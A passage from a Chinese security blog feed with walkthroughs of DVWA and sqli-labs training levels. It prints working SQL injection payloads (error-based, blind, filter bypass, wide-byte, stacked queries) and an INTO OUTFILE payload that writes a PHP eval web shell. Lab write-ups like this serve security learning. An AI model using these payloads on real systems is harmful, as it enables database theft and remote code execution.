class="hljs-variable">$data</span>-&gt;rowCount()</span></span> == <span class="hljs-number">1</span> ) <span class="hljs-comment">//限制了只允许返回一条数据</span></code></pre><p><img src="/2021/01/22/dvwa/12.jpg" alt="12"></p><p>PDO可以防止sql注入</p><ul><li>查询仅需解析（或预处理）一次，但可以用相同或不同的参数执行多次。当查询准备好后，数据库将分析、编译和优化执行该查询的计划。对于复杂的查询，此过程要花费较长的时间，如果需要以不同参数多次重复相同的查询，那么该过程将大大降低应用程序的速度。通过使用预处理语句，可以避免重复分析/编译/优化周 期。简言之，预处理语句占用更少的资源，因而运行得更快。</li><li>提供给预处理语句的参数不需要用引号括起来，驱动程序会自动处理。如果应用程序只使用预处理语句，可以确保不会发生SQL 注入。（然而，如果查询的其他部分是由未转义的输入来构建的，则仍存在 SQL 注入的风险）。</li></ul><p>详情见：<a href="https://www.cnblogs.com/leezhxing/p/5282437.html">PDO防SQL注入原理分析</a></p><h2 id="SQL-Injection-v2"><a class="header-anchor" href="#SQL-Injection-v2">🍭</a>SQL Injection</h2><h3 id="low-v2"><a class="header-anchor" href="#low-v2">🍭</a>low</h3><p>试探</p><p><img src="/2021/01/22/dvwa/13.jpg" alt="13"></p><p>单引号注入，没有任何过滤，思路讲过了，也可以用sqlmap跑。</p><h3 id="medium-v2"><a class="header-anchor" href="#medium-v2">🍭</a>medium</h3><p>POST型，抓包，F12都可，</p><p>源代码中用了<code>mysql_escape_string()</code>对单引号，双引号，反斜杠等过滤，碰到过滤的字符记得进制转换一下，步骤不再赘述。</p><h3 id="high-v2"><a class="header-anchor" href="#high-v2">🍭</a>high</h3><p>将操作页面和显示页面分开，将提交的值传递到显示页面的cookie字段中。</p><p>sql语句中增加了<code>limit 1</code>:限定了输出结果条数。</p><pre><code class="hljs angelscript"><span class="hljs-comment">// Might sleep a random amount</span>       <span class="hljs-keyword">if</span>( rand( <span class="hljs-number">0</span>, <span class="hljs-number">5</span> ) == <span class="hljs-number">3</span> ) &#123;           sleep( rand( <span class="hljs-number">2</span>, <span class="hljs-number">4</span> ) );       &#125;</code></pre><p>随机执行sleep()函数，延迟的时间是随机在2-4s，这会时间盲注测试造成干扰，故本关可用布尔盲注。</p><h3 id="impossible-v2"><a class="header-anchor" href="#impossible-v2">🍭</a>impossible</h3><p><code>is_numeric()</code>限制数字查询,<code>Anti-CSRF token</code>防御,<code>PDO</code>防SQL注入,sql语句的<code>limit 1</code>这些家伙又出现了，不赘述辽~~</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>DVWA||Brute Force</title>
    <link href="/2020/12/26/dvwa%E4%BA%8C/"/>
    <url>/2020/12/26/dvwa%E4%BA%8C/</url>
    
    <content type="html"><![CDATA[<h1>dvwa</h1><h2 id="Brute-Force"><a class="header-anchor" href="#Brute-Force">🍭</a>Brute Force</h2><h4 id="low"><a class="header-anchor" href="#low">🍭</a>low</h4><h3 id="暴力破解，查看源代码："><a class="header-anchor" href="#暴力破解，查看源代码：">🍭</a>暴力破解，查看源代码：</h3><p><img src="/2020/12/26/dvwa%E4%BA%8C/2.jpg" alt="2"></p><p>它的select语句没有什么过滤，可以尝试sql注入构造<code>admin'#</code>密码为空：</p><p><img src="/2020/12/26/dvwa%E4%BA%8C/3.jpg" alt="3"></p><p>成功~~但这关标题为暴力破解，所以要按暴力破解做一遍：</p><p>抓包,发到intruder,先clear ，选中要爆破字段,添加：</p><p><img src="/2020/12/26/dvwa%E4%BA%8C/1.jpg" alt="1"></p><p>在payload中选择字典，读取（字典很大读取了好久）：</p><p><img src="/2020/12/26/dvwa%E4%BA%8C/5.jpg" alt="5"></p><p>可设置线程数也可以使用默认：</p><p><img src="/2020/12/26/dvwa%E4%BA%8C/6.jpg" alt="6"></p><p>上图是我设置的线程数（线程数主要是设置一些重试时间，开始时间，线程数量等数据），就然后就可以开始破解：</p><p><img src="/2020/12/26/dvwa%E4%BA%8C/4.jpg" alt="4"></p><p>length可以对响应包的长度进行排序，找最大或最小的值（<strong>响应报文不一样，密码正确和错误返回的不是同一个响应报文，其长度一般都不同，故找出不同的一项，就可以找出正确的一项</strong>)然后看这个HTTP请求的响应报文：</p><img src="/2020/12/26/dvwa%E4%BA%8C/8.jpg" alt="8" style="zoom:50%;"><p>报文中<code>welcome to the password protected area admin</code>表示成功登录。</p><p><img src="/2020/12/26/dvwa%E4%BA%8C/9.jpg" alt="9"></p><h3 id="medium"><a class="header-anchor" href="#medium">🍭</a>medium</h3><p>查看源码:</p><p><img src="/2020/12/26/dvwa%E4%BA%8C/10.jpg" alt="10"></p><p>对传过来的值，使用了 <code>mysql_real_escape_string()</code> 函数，转义了以下字符：</p><pre><code class="hljs text">\x00 \n \r \ &#x27; &quot; \x1a</code></pre><p>还使用了sleep(2)在密码错误的时候延时两秒：</p><p><img src="/2020/12/26/dvwa%E4%BA%8C/11.jpg" alt="11"></p><p>与low等级类似，但转义了很多字符不能再用SQL注入，暴力破解与前面操作一样。</p><h3 id="high"><a class="header-anchor" href="#high">🍭</a>high</h3><p>查看源码：</p><p><img src="/2020/12/26/dvwa%E4%BA%8C/22.jpg" alt="22"></p><p>发现登录验证时提交了username、password、login、user_token参数，服务器返回登陆页面时包含一个随机的user_token的值，每次登录时都要将user_token一起提交。服务器收到请求后，会先验证token，再进行sql查询。本关还使用了<a href="https://www.w3school.com.cn/php/func_string_stripslashes.asp">stripslashes</a>函数（去除字符串中的反斜线字符,如果有两个连续的反斜线,则只去掉一个），<code> mysql_real_escape_string</code>对参数username、password进行过滤、转义,抵御sql注入。还是使用抓包，等学会python再用脚本做一遍。</p><h4 id="抓包"><a class="header-anchor" href="#抓包">🍭</a>抓包</h4><p>burp suite 有四种攻击模式，之前讲到的抓包中都使用狙击手模式，因为只需爆破一个位置，本关需要两个爆破位置故选择草叉模式（草叉模式允许使用多组payload组合，在每个标记位置上遍历所有payload组合)关于攻击模式详细看教程：<a href="https://www.cnblogs.com/diligenceday/p/12316899.html">攻击模式</a></p><h4 id="设置变量"><a class="header-anchor" href="#设置变量">🍭</a>设置变量</h4><h4 id="12"><a class="header-anchor" href="#12">🍭</a><img src="/2020/12/26/dvwa%E4%BA%8C/12.jpg" alt="12"></h4><h4 id="设置线程"><a class="header-anchor" href="#设置线程">🍭</a>设置线程</h4><p>因为草叉模式只允许单线程，故线程要设为一。</p><h4 id="设置options"><a class="header-anchor" href="#设置options">🍭</a>设置options</h4><p>Grep-Extract提取响应消息中的有用信息，添加设置：</p><img src="/2020/12/26/dvwa%E4%BA%8C/15.jpg" alt="15" style="zoom:50%;"><p>选中value值表示每次从响应中获得该值，将Redirections设置为Always。</p><h4 id="设置payloads"><a class="header-anchor" href="#设置payloads">🍭</a>设置payloads</h4><p>第一个参数不再赘述</p><img src="/2020/12/26/dvwa%E4%BA%8C/5-1610728925860.jpg" alt="5" style="zoom:50%;"><p>第二个参数</p><img src="/2020/12/26/dvwa%E4%BA%8C/14.jpg" alt="14" style="zoom:50%;"><p>红线部分为options中复制的token值。</p><h4 id="爆破"><a class="header-anchor" href="#爆破">🍭</a>爆破</h4><p><img src="/2020/12/26/dvwa%E4%BA%8C/13.jpg" alt="13"></p><h3 id="impossible"><a class="header-anchor" href="#impossible">🍭</a>impossible</h3><p>这个源代码有点复杂：</p><p><img src="/2020/12/26/dvwa%E4%BA%8C/16.jpg" alt="16"></p><p><img src="/2020/12/26/dvwa%E4%BA%8C/17.jpg" alt="17"><img src="/2020/12/26/dvwa%E4%BA%8C/18.jpg" alt="18"></p><p>本关一样有token值，但是两个级别最外层的爆破在通过字典尝试不同口令的时候，high只要发POST请求报文，就能从对应的响应报文拿到下次再发POST请求报文时需要用到的user_token。**但impossible只有先发送GET方式的请求报文，才能获取到服务器发回来的一次性user_token。**而GET方式的请求报文，无法提交爆破参数，只能通过POST方式的请求报文来提交爆破所用到的参数，所以需要在BurpSuite里建立一个宏来反复进行操作。</p><h4 id="建立宏"><a class="header-anchor" href="#建立宏">🍭</a>建立宏</h4><p>直接对dvwa靶机的登录界面进行破解，在project options的sessions中添加Macros。</p><p>选择登录页面</p><p><img src="/2020/12/26/dvwa%E4%BA%8C/19.jpg" alt="19"></p><p>选择token后定义参数</p><p><img src="/2020/12/26/dvwa%E4%BA%8C/20.jpg" alt="20"></p><p>在configure item中添加</p><img src="/2020/12/26/dvwa%E4%BA%8C/21.jpg" alt="21" style="zoom:67%;"><p>添加规则时注意描述规则时要将其参数范围定义到所有网址，全局宏定义就结束了</p><p><img src="/2020/12/26/dvwa%E4%BA%8C/23.jpg" alt="23"></p><p>接下来把提交的登录信息的包发送到入侵模块<strong>此时要选择post模式</strong></p><p><img src="/2020/12/26/dvwa%E4%BA%8C/25.jpg" alt="25"></p><p>接下来跟high等级一样但攻击模式要选默认的狙击手模式</p><p><img src="/2020/12/26/dvwa%E4%BA%8C/24.jpg" alt="24"></p><p>爆破成功~~</p><p>impossible和high级别的爆破涉及到登陆返回页面中产生的随机值user_token，在用户登录时要将user_token一起提交。由于user_token可提交报文的方式不同，high和impossible级别的爆破过程也不同。</p><p>至此dvwa的暴力破解就结束了~~</p><p>参考文献：<a href="https://zhuanlan.zhihu.com/p/126639909">DVWA教程之Brute Force（high、impossible）</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>sqli-labs(七)</title>
    <link href="/2020/12/17/sqli-labs%E4%B8%83/"/>
    <url>/2020/12/17/sqli-labs%E4%B8%83/</url>
    
    <content type="html"><![CDATA[<h1>Less-42</h1><p>初看页面,考虑到二次注入，查看update的源码：</p><p><img src="/2020/12/17/sqli-labs%E4%B8%83/1.jpg" alt="1"></p><p>数据需经函数处理，故不能进行二次注入，再查看login的代码：</p><p><img src="/2020/12/17/sqli-labs%E4%B8%83/2.jpg" alt="2"></p><p>密码无函数处理，在密码进行注入<code>a';create table hi like users#</code></p><p>注入前：</p><p><img src="/2020/12/17/sqli-labs%E4%B8%83/3.jpg" alt="3"></p><p>注入后:</p><p><img src="/2020/12/17/sqli-labs%E4%B8%83/4.jpg" alt="4"></p><h1>Less-46</h1><p>在之前的MySQL里有介绍查询语句：<code>select &lt;列名&gt; from &lt;表名&gt; [where &lt;查询条件表达试&gt;] [order by &lt;排序的列名&gt;[asc或desc]]</code>,而46关就与此相关。先看源码：</p><p><img src="/2020/12/17/sqli-labs%E4%B8%83/5.jpg" alt="5"></p><p>发现这关使用sort代替id，并且为数字型注入，试改变sort的值：</p><img src="/2020/12/17/sqli-labs%E4%B8%83/6.jpg" alt="6" style="zoom:50%;"><p>在后接上asc(升序)或者desc(降序);</p><img src="/2020/12/17/sqli-labs%E4%B8%83/7.jpg" alt="7" style="zoom:50%;"><p>发现修改order by 后面的参数执行结果不同，推测注入点在<code>order by</code>后的参数中，查询官方文件：<a href="https://dev.mysql.com/doc/refman/8.0/en/select.html">MySQL</a></p><p><img src="/2020/12/17/sqli-labs%E4%B8%83/8.jpg" alt="8"></p><p>可利用order by 后参数进行注入。开始尝试：</p><h4 id="法一：报错注入"><a class="header-anchor" href="#法一：报错注入">🍭</a>法一：报错注入</h4><p><code>?sort=1 and updatexml(1,concat(0x7e,database()),1)</code></p><p><img src="/2020/12/17/sqli-labs%E4%B8%83/9.jpg" alt="9"></p><p>也可以用floor():</p><p><code>?sort=(select count(*) from information_schema.schemata group by concat_ws('-',(select database()),floor(rand()*2)))</code></p><p><img src="/2020/12/17/sqli-labs%E4%B8%83/12.jpg" alt="12"></p><p>也可以用extractvalue():</p><p><code>and extractvalue(1,concat(0x7e,(select database()),0x7e))</code></p><p><img src="/2020/12/17/sqli-labs%E4%B8%83/16.jpg" alt="16"></p><h4 id="法二：时间盲注"><a class="header-anchor" href="#法二：时间盲注">🍭</a>法二：时间盲注</h4><p><code>and if(left(database(),8)='security',sleep(5),1)--+</code></p><img src="/2020/12/17/sqli-labs%E4%B8%83/10.jpg" alt="10" style="zoom:50%;"><p>但是我发现在错误的情况下，休眠时间超过5秒网页还会报错，在数据库里操作:</p><img src="/2020/12/17/sqli-labs%E4%B8%83/11.jpg" alt="11" style="zoom:50%;"><p>好像挺正常的，可是在火狐里就是很诡异，有个说法是添加<code>sleep(N)</code>这个函数后，语句的执行具体会停留多长时间取决于<strong>满足条件的记录数</strong>，MySQL 会对<strong>每条</strong>满足条件的记录停留 N 秒钟，可如果因为这个的话，应该是延时很久，不至于网页报错啊。。。。。。</p><h4 id="法三：rand-函数"><a class="header-anchor" href="#法三：rand-函数">🍭</a>法三：rand()函数</h4><p>格式：<code>?sort=rand(sql 语句)</code></p><p>rand(true):</p><img src="/2020/12/17/sqli-labs%E4%B8%83/13.jpg" alt="13" style="zoom:50%;"><p>rand(flase):</p><img src="/2020/12/17/sqli-labs%E4%B8%83/15.jpg" alt="15" style="zoom:50%;"><p><code>?sort=rand(left(database(),8)='security')</code>:</p><img src="/2020/12/17/sqli-labs%E4%B8%83/14.jpg" alt="14" style="zoom:50%;"><p>页面和true一样，故该语句正确。</p><h4 id="法四-一句话木马"><a class="header-anchor" href="#法四-一句话木马">🍭</a>法四:一句话木马</h4><p>先介绍一个语法：</p><pre><code class="hljs livecodeserver"><span class="hljs-keyword">lines</span> terminated <span class="hljs-keyword">by</span> <span class="hljs-number">0</span>x*<span class="hljs-comment">*//每行输出以0x**结尾</span></code></pre><p>接下来要导文件，可能有人会遇到一样的问题，执行导文件命令后报错：The MySQL server is running with the --secure-file-priv option so it cannot execute，需到MySQL命令里查询：</p><p><img src="/2020/12/17/sqli-labs%E4%B8%83/17.jpg" alt="17"></p><p>值为null,表示限制mysqld 不允许导入导出，需到MySQL配置文件里更改<code>secure_file_priv =</code>为空白</p><p>再查询：</p><p><img src="/2020/12/17/sqli-labs%E4%B8%83/18.jpg" alt="18"></p><p>即可导出文件。</p><p><code>?sort=1 into outfile &quot;D:\\phpstudy_pro\\WWW\\sql\\less-46\\lll.php&quot; lines terminated by 0x3c3f706870206576616c28245f504f53545b22636d64225d293b3f3e --+</code>(<strong>0x一定要记得加，一开始忘记加一直报错。。。</strong>)</p><p><img src="/2020/12/17/sqli-labs%E4%B8%83/19.jpg" alt="19"></p><p>在目录里可找到如上文件，连接到蚁剑：</p><p><img src="/2020/12/17/sqli-labs%E4%B8%83/20.jpg" alt="20"></p><p>47关单引号包裹其余相同，48关除了不报错其余也一样，49关单引号包裹无回显。</p><h1>Less-50</h1><p>查源码：</p><p><img src="/2020/12/17/sqli-labs%E4%B8%83/21.jpg" alt="21"></p><p>用了mysqli_multi_query()函数：执行一个或多个针对数据库的查询。故可用堆叠注入：</p><p><code>?sort=1; create table hhh like users;</code></p><p><img src="/2020/12/17/sqli-labs%E4%B8%83/22.jpg" alt="22"></p><p>之前的方法仍适用,也可以堆叠方法构造一句话木马。51关单引号包裹其余相同。52关没有回显，其余与50关相同，53关单引号包裹也无回显，其余相同。</p><h1>Less-54</h1><p>接下来是进阶学习，这一关主要考察字符型注入，但是只能尝试十次，这里的表名和密码等是每十次尝试后就强制进行更换。</p><p>盲猜单引号注入：</p><p><img src="/2020/12/17/sqli-labs%E4%B8%83/23.jpg" alt="23"></p><p>查字段数：</p><p><img src="/2020/12/17/sqli-labs%E4%B8%83/24.jpg" alt="24"></p><p>爆表:</p><p><img src="/2020/12/17/sqli-labs%E4%B8%83/25.jpg" alt="25"></p><p>爆列：<img src="/2020/12/17/sqli-labs%E4%B8%83/26.jpg" alt="26"></p><p>爆值:</p><p><img src="/2020/12/17/sqli-labs%E4%B8%83/27.jpg" alt="27"></p><p>输入密钥：</p><p><img src="/2020/12/17/sqli-labs%E4%B8%83/28.jpg" alt="28"></p><h1>Less-55</h1><p>这关有点奇葩我试了七次才试出闭合方式，居然是数字型的小括号包裹：</p><p><code>?id=1)--+</code></p><p><img src="/2020/12/17/sqli-labs%E4%B8%83/29.jpg" alt="29"></p><p>爆表：</p><p><code>?id=0) union select 1,2,group_concat(table_name) from information_schema.tables where table_schema='challenges'--+</code></p><p><img src="/2020/12/17/sqli-labs%E4%B8%83/30.jpg" alt="30"></p><p>爆列：</p><p><code>?id=0） union select 1,2,group_concat(column_name) from information_schema.columns where table_schema='challenges' and table_name='8dzw16d8m5'--+</code></p><p><img src="/2020/12/17/sqli-labs%E4%B8%83/31.jpg" alt="31"></p><p>爆值：</p><p><code>?id=0) union select 1,2,group_concat(secret_97U6) from challenges.8dzw16d8m5--+</code><img src="/2020/12/17/sqli-labs%E4%B8%83/32.jpg" alt="32"></p><p>成功~~:</p><p><img src="/2020/12/17/sqli-labs%E4%B8%83/33.jpg" alt="33"></p><p>56关为<code>')</code>包裹，57为双引号包裹。</p><h1>Less-58</h1><p>在之前的关卡中报错都被注释，报错注入就不能使用，故前面的操作次数较多，而此关只有五次，查看源代码：</p><p><img src="/2020/12/17/sqli-labs%E4%B8%83/34-1608353774465.jpg" alt="34"></p><p>报错没有被注释，故用报错注入。</p><p>单引号包裹：</p><p><img src="/2020/12/17/sqli-labs%E4%B8%83/35.jpg" alt="35"></p><p>爆表：</p><p><code>?id=1' and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema='challenges') ),1)--+</code></p><p><img src="/2020/12/17/sqli-labs%E4%B8%83/36.jpg" alt="36"></p><p>爆列:</p><p><code>?id=1' and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where  table_name='933h2rr0c5' )),1)--+</code><img src="/2020/12/17/sqli-labs%E4%B8%83/37.jpg" alt="37"></p><p>爆值：</p><p><code>?id=1' and updatexml(1,concat(0x7e,(select group_concat(secret_GJ8R) from challenges.933h2rr0c5 )),1)--+</code><img src="/2020/12/17/sqli-labs%E4%B8%83/38.jpg" alt="38"></p><p>成功：</p><p><img src="/2020/12/17/sqli-labs%E4%B8%83/39.jpg" alt="39"></p><p>59数字型注入，60<code>&quot;)</code>包裹，61关值得注意的是它是<code>'))'</code>包裹的，第一遍我试了四次才出来，这个故事告诉我们要打破前面关卡的固有思维。。。。。</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>sqli-labs（六）</title>
    <link href="/2020/12/14/sqli-labs%E5%85%AD/"/>
    <url>/2020/12/14/sqli-labs%E5%85%AD/</url>
    
    <content type="html"><![CDATA[<h1>Less-27</h1><p>查看源码：</p><p><img src="/2020/12/14/sqli-labs%E5%85%AD/2.jpg" alt="2"></p><p>这关额外注释了union,select,字符。</p><p>单引号报错，注释掉回显正常：</p><p><img src="/2020/12/14/sqli-labs%E5%85%AD/1.jpg" alt="1"></p><h2 id="法一：联合查询"><a class="header-anchor" href="#法一：联合查询">🍭</a>法一：联合查询</h2><p>将union和select改为大小写混合就可以:</p><p><code>?id=0'%0aUnIoN%0aSeLeCt%0a1,database(),2%0a%26%26%0a'1'='1</code></p><p><img src="/2020/12/14/sqli-labs%E5%85%AD/3.jpg" alt="3"></p><p>不再赘述</p><h2 id="法二：报错注入"><a class="header-anchor" href="#法二：报错注入">🍭</a>法二：报错注入</h2><p><code>?id=1'%a0||%a0updatexml(1,concat(0x7e,(database())),1) %a0||'1'='1</code><img src="/2020/12/14/sqli-labs%E5%85%AD/4.jpg" alt="4"></p><h2 id="法三：布尔注入"><a class="header-anchor" href="#法三：布尔注入">🍭</a>法三：布尔注入</h2><p><code>?id=1'%0a%26%26%0aleft((select database()),8)='security'%26%26'1'='1</code></p><p><img src="/2020/12/14/sqli-labs%E5%85%AD/5.jpg" alt="5"></p><h1>Less-27a</h1><p>试探出双引号注入：</p><p><img src="/2020/12/14/sqli-labs%E5%85%AD/6.jpg" alt="6"></p><p>查看源码：</p><p><img src="/2020/12/14/sqli-labs%E5%85%AD/7.jpg" alt="7"></p><p>注释报错，不能用报错注入，步骤类似，不再赘述。</p><h1>Less-28</h1><p>单引号报错，单引号加括号也报错,将其分别注释：</p><p><img src="/2020/12/14/sqli-labs%E5%85%AD/9.jpg" alt="9"></p><p>回显正常</p><p><img src="/2020/12/14/sqli-labs%E5%85%AD/10.jpg" alt="10"></p><p>回显正常？？将单引号闭合的id换掉：</p><p><img src="/2020/12/14/sqli-labs%E5%85%AD/11.jpg" alt="11"></p><p>发现回显是id为1的用户，故判断为<code>')'</code>注入。也可以用<code>;%00</code>注释可避免这个问题。</p><p>查源码：<img src="/2020/12/14/sqli-labs%E5%85%AD/8.jpg" alt="8"></p><p>少了 and和 or的注释，过滤了相连的<code>union</code>和<code>select</code>，正则表达式中\s表示匹配一个空格，也能匹配包括tab键等任意空白字符如制表符、换行符、空格等，因此%0a换行符也被匹配了，只能使用%a0来绕过，<code>/i</code>同时匹配大小写，过滤了<code>--</code>、<code>#</code>以及<code>/**/</code>，  过滤了两次空格，过滤了<code>/</code>没过滤<code>\</code>，其余步骤类似：</p><p><code>?id=0')%a0uniOn%a0sElEct%a01,database(),3%a0or%a0('1')=('1</code><img src="/2020/12/14/sqli-labs%E5%85%AD/12.jpg" alt="12"></p><p>不再赘述。</p><h1>Less-28a</h1><p>查看源码：</p><p><img src="/2020/12/14/sqli-labs%E5%85%AD/13.jpg" alt="13"></p><p>少了很多注释</p><p><code>?id=0') uniOn%a0sElEct 1,database(),3 or ('1')=('1</code><img src="/2020/12/14/sqli-labs%E5%85%AD/14.jpg" alt="14"></p><p>不再赘述</p><h1>Less-29</h1><p>正常开始打，发现它与第1关一样，查了教程这一次29-32关在其他地方，同时还需要配置jspstudy环境,推荐教程：<a href="https://www.cnblogs.com/heiwa-0924/p/12369438.html">Less-29</a>,注意：<strong>jspstudy的端口问题，不与PHPstudy共用80，否则会冲突</strong>设置好变量后出现如下页面:</p><p><img src="/2020/12/14/sqli-labs%E5%85%AD/15.jpg" alt="15"></p><p>补充知识:</p><h2 id="服务器（两层）架构"><a class="header-anchor" href="#服务器（两层）架构">🍭</a>服务器（两层）架构</h2><img src="/2020/12/14/sqli-labs%E5%85%AD/16.jpg" style="zoom: 67%;"><p>服务器端有两个部分：第一部分为tomcat为引擎的jsp型服务器，第二部分为apache为引擎的php服务器，真正提供web服务的是php服务器。工作流程如上图，apache解析最后一个参数，Tomcat（jsp）解析第一个参数。tomcat服务器处做数据过滤和处理，功能类似为一个WAF。因为解析参数的不同，我们可以利用该原理绕过WAF的检测。该用法就是http参数污染攻击的一个应用。HPP可对服务器和客户端都能够造成一定的威胁。推荐教程：<a href="https://www.cnblogs.com/lcamry/p/5762961.html">服务器两层架构</a></p><p>单引号报错：</p><p><img src="/2020/12/14/sqli-labs%E5%85%AD/17.jpg" alt="17"></p><p>注释后回显正常：</p><p><img src="/2020/12/14/sqli-labs%E5%85%AD/18.jpg" alt="18"></p><p>不再赘述。</p><h1>Less-32</h1><p>登录，发现转义</p><p><img src="/2020/12/14/sqli-labs%E5%85%AD/19.jpg" alt="19"></p><p>查看源码:</p><p><img src="/2020/12/14/sqli-labs%E5%85%AD/21.jpg" alt="21"></p><p>此关为宽字节注入，在之前文章SQL基础里有介绍，推荐解码网站：<a href="http://www.mytju.com/classcode/tools/urldecode_gb2312.asp">GBK解码</a>，</p><h4 id="法一"><a class="header-anchor" href="#法一">🍭</a>法一</h4><p>添加%df,构造宽字节注入漏洞：</p><img src="/2020/12/14/sqli-labs%E5%85%AD/20.jpg" alt="20" style="zoom: 33%;"><h4 id="法二"><a class="header-anchor" href="#法二">🍭</a>法二</h4><p>%5c表示\ ，如果能将返回的结果中对于单引号没有转义字符进行处理，如用字母组合使其形成宽字节，从而使\（斜杠）失效，也可达到宽字节漏洞，例如用%c’ccc和%5c进行组合，这里hh可随意。</p><p><img src="/2020/12/14/sqli-labs%E5%85%AD/22.jpg" alt="22"></p><p>效果如下:</p><p><img src="/2020/12/14/sqli-labs%E5%85%AD/23.jpg" alt="23"></p><p>不再赘述。</p><h1>Less-33</h1><p>单引号仍出现转义，查看源码：</p><p><img src="/2020/12/14/sqli-labs%E5%85%AD/24.jpg" alt="24"></p><p>这一关使用的是addslashes()函数过滤。</p><p>addslashes()：返回在预定义字符之前添加反斜杠的字符串。用于为存储在数据库中的字符串以及数据库查询语句准备字符串。<strong>PHP 对所有的 GET、POST 和 COOKIE 数据自动运行 addslashes()。因此不应对已转义过的字符串使用  addslashes()，这样会导致双层转义</strong></p><p>预定义字符是：</p><ul><li>单引号（'）</li><li>双引号（&quot;）</li><li>反斜杠（\）</li><li>NULL</li></ul><h1>Less-34</h1><p>登录：</p><p><img src="/2020/12/14/sqli-labs%E5%85%AD/25.jpg" alt="25"></p><p>还是存在转义，之前的关卡是get型的方式以url形式提交的，因此数据会通过URLencode，而现在是post型。</p><h3 id="法一-v2"><a class="header-anchor" href="#法一-v2">🍭</a>法一</h3><p>介绍一个新知识(详细教程：<a href="https://blog.csdn.net/guxiaonuan/article/details/78678043">字符编码的概念</a>)</p><p>Unicode 可以使用的编码有三种，分别是：</p><ul><li>UFT-8：一种变长的编码方案，使用 1~6 个字节来存储；</li><li>UFT-32：一种固定长度的编码方案，不管字符编号大小，始终使用 4 个字节来存储；</li><li>UTF-16：介于 UTF-8 和 UTF-32 之间，使用 2 个或者 4 个字节来存储，长度既固定又可变。</li></ul><p>将utf-8转换为utf-16或 utf-32，例如将 ’ 转为utf-16为 �’。</p><h4 id="union联合注入"><a class="header-anchor" href="#union联合注入">🍭</a>union联合注入</h4><p>登录如下：</p><p><img src="/2020/12/14/sqli-labs%E5%85%AD/26.jpg" alt="26"></p><p>查库：</p><img src="/2020/12/14/sqli-labs%E5%85%AD/27.jpg" alt="27" style="zoom:50%;"><h4 id="报错注入"><a class="header-anchor" href="#报错注入">🍭</a>报错注入</h4><p><img src="/2020/12/14/sqli-labs%E5%85%AD/28.jpg" alt="28"></p><h3 id="法二-v2"><a class="header-anchor" href="#法二-v2">🍭</a>法二</h3><h4 id="抓包"><a class="header-anchor" href="#抓包">🍭</a>抓包</h4><p>在火狐效仿前几关用%df’宽字节注入：<code>uname=-1%df' &amp;passwd=123&amp;submit=Submit</code>发现不行？？</p><p>抓个包:</p><p><img src="/2020/12/14/sqli-labs%E5%85%AD/30.jpg" alt="30"></p><p>发现奇奇怪怪的转义，所以只能在burp suite更改：</p><p><img src="/2020/12/14/sqli-labs%E5%85%AD/29.jpg" alt="29"></p><h1>Less-35</h1><p>这关有点奇怪，数字型注入还对<code>'</code>转义？？？按照流程正常注入即可，后期遇到<code>'security'</code>在进行编码即可。</p><h1>Less-36</h1><p>get宽字节注入，换了个函数:</p><p><img src="/2020/12/14/sqli-labs%E5%85%AD/31.jpg" alt="31"></p><p>对以下字符转义:</p><pre><code class="hljs asciidoc"><span class="hljs-bullet">- </span>\x00<span class="hljs-bullet">- </span>\n<span class="hljs-bullet">- </span>\r<span class="hljs-bullet">- </span>\<span class="hljs-bullet">- </span><span class="hljs-emphasis">&#x27;</span><span class="hljs-emphasis">- &quot;</span><span class="hljs-emphasis">- \x1a</span></code></pre><p>跟之前一样:</p><p><img src="/2020/12/14/sqli-labs%E5%85%AD/32.jpg" alt="32"></p><p>or</p><p><img src="/2020/12/14/sqli-labs%E5%85%AD/33.jpg" alt="33"></p><p>火狐好像对<code>%df'</code>有恶意，执行会报错，以上是用Microsoft Edge执行的。</p><h1>Less-37</h1><p>本关与 34 关是大致相似的,post宽字节注入，区别在于处理 post 内容用的是 mysql_real_escape_string()<br>函数，而不是 addslashes()函数，但是原理是一样的，</p><h1>Less-38</h1><h4 id="Stacked-injection"><a class="header-anchor" href="#Stacked-injection">🍭</a>Stacked injection</h4><p>多条sql语句一起执行，和union语句有点像，但是union 或者union all执行的语句类型是有限的，可以用来执行查询语句，而堆叠注入可以执行的是任意的语句，但并不是每一个环境下都可以执行，可能受到API或者数据库引擎不支持的限制。在web系统中，代码只返回一个查询结果，因此，堆叠注入第二个语句产生错误或者结果只能被忽略，在前端界面无法看到返回结果。</p><p>源代码：</p><img src="/2020/12/14/sqli-labs%E5%85%AD/34.jpg" alt="34" style="zoom: 80%;"><p>发现多个函数:<a href="https://link.jianshu.com?t=http%3A%2F%2Fwww.runoob.com%2Fphp%2Ffunc-mysqli-more-results.html">PHP mysqli_more_results() 函数</a> <a href="https://link.jianshu.com?t=http%3A%2F%2Fwww.runoob.com%2Fphp%2Ffunc-mysqli-multi-query.html">PHP mysqli_multi_query() 函数</a> <a href="https://link.jianshu.com?t=http%3A%2F%2Fphp.net%2Fmanual%2Fzh%2Fmysqli.store-result.php">mysqli_store_result</a>，经查询均与连接数据库有关。</p><p>试探为单引号，进行插入：<code>id=1';insert into users(id,username,password) values (38,'111','222')--+</code></p><p>查询数据库：</p><p><img src="/2020/12/14/sqli-labs%E5%85%AD/35.jpg" alt="35"></p><p>成功插入。</p><h1>Less-39</h1><p>试探为数字型注入，一样的操作</p><p><img src="/2020/12/14/sqli-labs%E5%85%AD/36.jpg" alt="36"></p><p>40,41关也一样，少了回显,不赘述。</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>sqli-labs五</title>
    <link href="/2020/12/09/sqli-labs%E4%BA%94/"/>
    <url>/2020/12/09/sqli-labs%E4%BA%94/</url>
    
